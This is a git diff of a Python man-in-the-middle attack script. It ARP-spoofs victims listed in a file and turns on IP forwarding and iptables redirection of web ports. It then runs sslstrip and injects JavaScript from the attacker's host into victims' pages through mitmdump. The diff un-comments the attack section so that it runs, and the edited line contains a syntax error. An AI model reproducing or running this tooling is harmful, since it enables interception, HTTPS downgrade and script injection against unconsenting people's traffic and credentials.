@@ -12,9 +12,6 @@ print("gateway: " + gateway)
 #get interface (attacker)
 interface = sys.argv[2]
 print("interface: " + interface)
-#get IP (attacker)
-attacker_ip = sys.argv[3]
-print("attacker_ip: " + attacker_ip)
 # get victims_ip
 victims = [line.rstrip('\n') for line in open("victims.txt")]
 print("victims:")
@@ -32,16 +29,13 @@ def get_ip_address(ifname):
         struct.pack('256s', bytes(ifname[:15],'utf-8'))
     )[20:24])
 
-print(get_ip_address(interface))
-
-'''
+attacker_ip = get_ip_address(interface))
 
 # configure routing (IPTABLES)
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 os.system("iptables -t nat -A POSTROUTING -o " + interface + " -j MASQUERADE")
 os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
 os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
-
 
 # run the arpspoof for each victim, each one in a new console
 for victim in victims:
@@ -56,8 +50,6 @@ os.system("sslstrip -l 8080 &")
 
 # start the mitmproxy
 os.system("mitmdump -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T")
-
-'''
 
 
 
